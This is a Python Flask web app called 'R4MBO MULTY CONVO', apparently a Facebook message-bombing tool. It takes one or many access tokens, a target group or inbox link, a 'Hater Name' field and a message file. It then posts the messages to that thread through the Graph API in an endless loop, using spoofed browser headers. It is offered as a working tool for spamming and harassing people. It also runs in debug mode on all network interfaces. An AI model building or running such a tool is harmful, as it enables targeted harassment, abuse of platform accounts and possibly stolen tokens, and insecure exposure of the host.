from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'Referer': 'https://www.google.com/'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"✅ Sent from {access_token[:15]}...: {message}")
                else:
                    print(f"❌ Failed from {access_token[:15]}...: {message}")
                    print(f"Response: {response.status_code} - {response.text}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId').strip()
        if 'facebook.com' in thread_id:
            thread_id = thread_id.split('/')[-1].split('?')[0]

        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>𝐑𝟒𝐌𝐁𝐎 𝐌𝐔𝐋𝐓𝐘 𝐂𝐎𝐍𝐕𝐎</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    body {
      background-color: black;
    }
    .video-background {
      position: fixed;
      top: 50%;
      left: 50%;
      width: 100%;
      height: 100%;
      object-fit: cover;
      transform: translate(-50%, -50%);
      z-index: -1;
    }
    .container {
      max-width: 350px;
      border-radius: 20px;
      padding: 20px;
      color: white;
    }
    .form-control {
      background: transparent;
      border: 1px solid white;
      color: white;
      border-radius: 10px;
      margin-bottom: 15px;
    }
    ::placeholder {
      color: #ccc;
    }
    .btn-submit {
      width: 100%;
    }
    .footer {
      text-align: center;
      color: #888;
      font-size: 14px;
    }
    .icon-link {
      font-size: 30px;
      margin: 0 10px;
      color: white;
      transition: transform 0.3s ease, color 0.3s ease;
      text-shadow: 0 0 5px #0ff;
    }
    .icon-link:hover {
      transform: scale(1.2);
      color: #0ff;
    }
    .facebook { color: #1877f2; }
    .whatsapp { color: #25d366; }
  </style>
</head>
<body>
<video id="bg-video" class="video-background" loop autoplay muted>
  <source src="https://raw.githubusercontent.com/HassanRajput0/Video/main/lv_0_20241003034048.mp4">
  Your browser does not support the video tag.
</video>

<div class="container mt-5 text-center">
  <h2 class="mb-4">♛༈𝐑𝟒𝐌𝐁𝐎 𝐗𝐃༈♛</h2>
  <form method="post" enctype="multipart/form-data">
    <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
      <option value="single">Single Token</option>
      <option value="multiple">Multy Token</option>
    </select>
    <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="Enter Single Token">
    <input type="file" class="form-control" id="tokenFile" name="tokenFile" style="display:none;">
    <input type="text" class="form-control" name="threadId" placeholder="Group/Inbox Link" required>
    <input type="text" class="form-control" name="kidx" placeholder="Hater Name" required>
    <input type="number" class="form-control" name="time" placeholder="Delay in Sec" required>
    <input type="file" class="form-control" name="txtFile" required>
    <button type="submit" class="btn btn-primary btn-submit">Run</button>
  </form>

  <form method="post" action="/stop" class="mt-4">
    <input type="text" class="form-control" name="taskId" placeholder="Enter Task ID to Stop" required>
    <button type="submit" class="btn btn-danger btn-submit mt-2">Stop</button>
  </form>

  <footer class="footer mt-4">
    <p>© 2024 Code by Rambo</p>
    <div class="social-icons mt-3">
      <a href="https://wa.me/9779815676876" target="_blank" class="icon-link whatsapp">
        <i class="fab fa-whatsapp"></i>
      </a>
      <a href="https://facebook.com/yourprofile" target="_blank" class="icon-link facebook">
        <i class="fab fa-facebook"></i>
      </a>
    </div>
  </footer>
</div>

<script>
  function toggleTokenInput() {
    var tokenOption = document.getElementById('tokenOption').value;
    document.getElementById('singleToken').style.display = tokenOption === 'single' ? 'block' : 'none';
    document.getElementById('tokenFile').style.display = tokenOption === 'multiple' ? 'block' : 'none';
  }
</script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        threads[task_id].join(timeout=1)
        del stop_events[task_id]
        del threads[task_id]
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)